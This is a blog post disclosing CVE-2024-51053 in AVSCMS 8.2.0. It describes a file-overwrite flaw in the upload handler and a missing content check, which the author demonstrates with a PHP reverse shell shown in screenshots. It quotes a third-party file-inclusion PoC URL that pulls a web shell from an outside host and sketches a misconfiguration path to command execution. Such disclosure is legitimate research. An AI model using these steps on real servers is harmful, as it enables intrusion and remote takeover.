<!doctype html>
    <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
            <link rel="stylesheet" type="text/css" href="../../styles.css">
            <title>Q | CVE-2024-51053</title>
        </head>
        <body>
            <h1>Q's blog</h1>
            <p class="pages">
                <a href="/">Home</a>
                <a href="/about">About me</a>
            </p>
            <h1>CVE-2024-51053 (Reserved) Improper File Upload Implementation in AVSCMS 8.2.0</h1>
            <p>
                This is a public record, and or proof of concept regarding CVE-2024-51053, a vulnerability affecting <a href="https://github.com/avscms/avscms">AVSCMS</a> version 8.2.0 using PHP version 5.6.40, includes:
                <ol>
                    <li>Arbitrary file rewrite via <a href="https://github.com/avscms/avscms/blob/main/fileupload.php">upload functionality</a></li>
                    <li>Lack of content validation in <a href="https://github.com/avscms/avscms/blob/main/fileupload.php">upload functionality</a></li>
                </ol>
            </p>
            <h2>Impact</h2>
            <h3>File Rewrite</h3>
            <p>
                The impact is pretty straightforward on the summary I provided above. So far the steps on how the application being uploaded on server is under "{working_directory}/media/videos/vid/{file}".
                Uniquely enough when tinker around with this vulnerability I found out that the application will use parameter id as the filename.
                Thus, if an attacker changes the file id on upload request, they can rewrite other user's file upload (pre-approval step).
                There are also other quirks upon manipulating this fileupload request, but I didn't spent that much time on researching AVSCMS so I opt not to dig further.
                The following images are illustration on how this vulnerability works or could be exploited.
            </p>
            <img src="images/1. Upload as user test.png" alt="Upload as user test">
            <p>Upload as user "test".</p>
            <img src="images/2. change id and name.png" alt="Use specific id and name">
            <p>Use a specific id for testing purpose.</p>
            <img src="images/3. Uploaded as test.mp4.png" alt="File uploaded">
            <p>File uploaded as test.mp4</p>
            <img src="images/4. Upload as user test2.png" alt="Upload as user test2">
            <p>Upload new file as user test2</p>
            <img src="images/5. Use the same name.png" alt="Using same id as before">
            <p>Use the same id parameter as test</p>
            <img src="images/6. File overwritten.png" alt="File overwritten">
            <p>File uploaded by test is overwritten (notice the different hashsum).</p>
            
            <h3>Lack of Content Validation</h3>
            <p>
                Another vulnerability impacting the file upload functionality is how the application doesn't validate the content of uploaded file as long as the file has a valid extension at the end.
                This means an attacker could upload a malicious binary pretending as a legitimate mp4 (video) file.
                I will demonstrate the steps to reproduce this vulnerability and what I think while researching this vuln later.
            </p>
            <img src="images/7. File to upload.png" alt="File to upload">
            <p>File to upload is a simple php reverse shell.</p>
            <img src="images/8. Upload file.png" alt="Upload the file">
            <img src="images/9. Rename to arbitrary filename.png" alt="Use arbitrary file name for easier access later.">
            <p>Upload the file using arbitrary filename via id parameter for easier access (remember file rewrite).</p>
            <img src="images/10. Uploaded.png" alt="File uploaded">
            <p>File uploaded despite having php content.</p>

            <h2>Deeper Dive / If you want to make CTF</h2>
            <p>
                On this part I wish to speak of another research, https://vulners.com/packetstorm/PACKETSTORM:173122 (Adult Video Script 8.2 File Inclusion).
                Theoretically by reading their PoC you could expect to chain lack this (File upload) vulnerability with Packetstorm's (File Inclusion) leading into RCE (Remote Command Execution)*.
                To my surprise, I found their following PoC:
                <pre>http://127.0.0.1/www/lustubecom/siteadmin/editor_files/image.php?lang_include=http://www.dcvi.net/r57.txt?</pre>
                Is invalid, let's check the supposedly affected <a href="https://github.com/avscms/avscms/blob/main/siteadmin/editor_files/image.php">source code</a>:
            </p>
            <img src="images/11. Target Include.png" alt="Targeted vulnerable code">
            <p>It's quite obvious that the research is trying to target this line of code.</p>
            <p>
                But if you read the source code completely that's not where lang_include is <b>declared/initiated</b> so in no way that you could inject using lang_include parameter.
                So... where is lang_include variable is initiated? well turns out it's inside <a href="https://github.com/avscms/avscms/blob/main/siteadmin/editor_files/includes/common.php">common.php</a>.
                Now, you might be tempted to say "Well, just inject it there n00b". Well try reading this!
            </p>
            <img src="images/12. Are you ok annie.png" alt="filter function">
            <p>wp_file_name_ok? what is that? exactly, you need to answer that question before exploiting it. Which can be <a href="https://github.com/avscms/avscms/blob/main/siteadmin/editor_files/editor_functions.php">found here</a>.</p>
            <img src="images/13. I am okay annie.png" alt="Filtered">
            <p>Yes, you read that right, the payload http://www.dcvi.net/r57.txt is filtered...</p>
            <p>
                So unless you find a way to bypass that filter. You are going nowhere sir. If you imagine that '.' and '/' is not filtered that this is an easy RCE (or simple CTF problem).
                Since I (again) didn't spend that much time to AVSCMS, and I simply don't want to spend more time for a bypass. This finding will remain as is.
            </p>
            <img src="images/14. Unrelated.jpg" alt="Unrelated">
            <p>Unrelated image that comes to my mind.</p>
            <p>
                Another interesting, way to make this vulnerability fun is via php server misconfiguration. 
                Imagine if the server is configured in such a way where they only read the .php extension and execute it. 
            </p>
            <img src="images/15. Misconfigure htaccess.png" alt=".htaccess misconfiguration">
            <p>Say we misconfigure the .htaccess* like above, we could easily simply acess the uploaded file and include it. Resulting in command execution.</p>
            <img src="images/16. Misconfigure exploit.png" alt="access file">
            <img src="images/17. RevShell.png" alt="Reverse shell">
            <p class="footer">
            <ol>
                <li><a href="https://www.invicti.com/learn/remote-code-execution-rce/">Remote Command Execution</a></li>
                <li><a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion">File Inclusion</a></li>
                <li><a href="https://httpd.apache.org/docs/2.4/howto/htaccess.html">.htaccess</a></li>
                <li><a href="https://cwe.mitre.org/data/definitions/434.html">Related CWE-434</a></li>
                <li><a href=" https://cwe.mitre.org/data/definitions/646.html">Related CWE-646</a></li>
            </ol>
            </p>
        </body>
    </html>